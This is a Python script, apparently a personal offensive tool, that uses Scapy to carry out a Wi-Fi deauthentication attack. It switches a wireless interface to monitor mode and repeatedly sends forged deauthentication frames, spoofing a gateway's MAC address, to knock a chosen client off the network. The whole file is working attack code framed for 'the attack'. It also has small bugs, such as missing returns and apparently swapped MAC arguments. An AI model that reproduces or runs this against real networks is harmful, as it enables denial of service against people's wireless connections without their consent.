#!/usr/bin/env python3
'''
@auth: Huzefa Dayanji
@role: Ethical Hacker
@lang: Python3
@desc: Performs De-Auth Attack
@date: 01/05/2025
@size: 4,319 KB
'''
import time
import argparse
import subprocess
from scapy.all import *

# function to check mode of interface
def check_interface_mode(interface):
	try:
		# Run the command to get the info of;
		# wireless interface
		command = ['iw', 'dev', interface, 'info']
		result = subprocess.run(command, capture_output = True, text = True, check = True)

		# Search for "type" in the output to find mode
		for line in result.stdout.splitlines():
			if "type" in line:
				mode = line.split()[-1]
				return mode
		# If "type" is not found in the output
		return "Unknown mode (could not determine)"
	except subprocess.CalledProcessError as e:
		f"Error : {e}. Ensure the interface exists and you have sufficient permissions."
	except FileNotFoundError:
		return "Error: The 'iw' command is not found. Please install 'iw' or ensure it's in your PATH."


# function to switch to managed mode
def set_manage_mode(interface):
	try:
		# Step 1: Bring the interface down, to apply changes safely
		subprocess.run(["sudo", "ip", "link", "set", interface, "down"], check=True)

		# Step 2: Set the interface to manage mode
		subprocess.run(["sudo", "iw", "dev", interface, "set", "type", "managed"], check=True)

		# Step 3: Bring the interface back up
		subprocess.run(["sudo", "ip", "link", "set", interface, "up"], check=True)

		return f"The interface {interface} has been successfully set to managed mode."
	except subprocess.CalledProcessError as e:
		f"Error: {e}. Ensure the interface exists and you have sufficient permissions."
	except FileNotFoundError:
		return "Error: The 'iw' command is not found. Please install 'iw' or ensure it's in your PATH."

# function to switch to monitor mode
def set_monitor_mode(interface):
    try:
        # Step 1: Bring the interface down, to apply changes safely
        subprocess.run(["sudo", "ip", "link", "set", interface, "down"], check=True)

        # Step 2: Set the interface to monitor mode
        subprocess.run(["sudo", "iw", "dev", interface, "set", "type", "monitor"], check=True)

        # Step 3: Bring the interface back up
        subprocess.run(["sudo", "ip", "link", "set", interface, "up"], check=True)

        return f"The interface {interface} has been successfully set to monitor mode."

    except subprocess.CalledProcessError as e:
        return f"Error: {e}. Ensure the interface exists and you have sufficient permissions."
    except FileNotFoundError:
        return "Error: Required tools (ip or iw) are not found. Please install them."

# Suppress Scapy's default output
conf.verb = 0

# Create Argument Parser
parser = argparse.ArgumentParser(description = "Perform De-authentication Attack")

# Define the arguments
parser.add_argument("-p", type=str, required = True, help = "Deauthentication packets")
parser.add_argument("-a", type=str, required = True, help = "Gateway MAC")
parser.add_argument("-c", type=str, required = True, help = "Client MAC")
parser.add_argument("-i", type=str, required = True, help = "Wireless Interface")

# Parse the arguments
args = parser.parse_args()

# Class 3 frame received from a nonassociated station
def deauth(target_mac, gateway_mac, iface):
    packet = RadioTap() / \
             Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / \
             Dot11Deauth(reason=7)
    sendp(packet, iface=iface, count=1, inter=0.1)
    # Custom output
    print(f"Deauthentication packet sent from {gateway_mac} to {target_mac} via interface {iface}")

# Check if interface is on managed, prompt;
# the user to switch to monitor
currentMode = check_interface_mode(args.i)
if currentMode == "managed":
	print(f"\nDear Hacker, The interface '{args.i}' is on managed mode.\n Do you want to switch to monitor mode to start the attack?\n\n")
	choice = input("1. Switch to Monitor Mode and Start the Attack.\n2. Don't Switch and Exit !!\n\nEnter your choice: ").strip()
	if choice == "1":
		set_monitor_mode(args.i)
	else:
		# print("\nSwitching the interface to managed mode....\n")
		# set_manage_mode(args.i)
		# time.sleep(2)
		exit(0)
# Transmit deauthenticate packet infinitely
p = 0
try:
    while p < int(args.p):
        deauth(args.a, args.c, args.i)
        p += 1
        time.sleep(1)
except KeyboardInterrupt:
    print("\nProgram exited by user\n")
    exit(0)
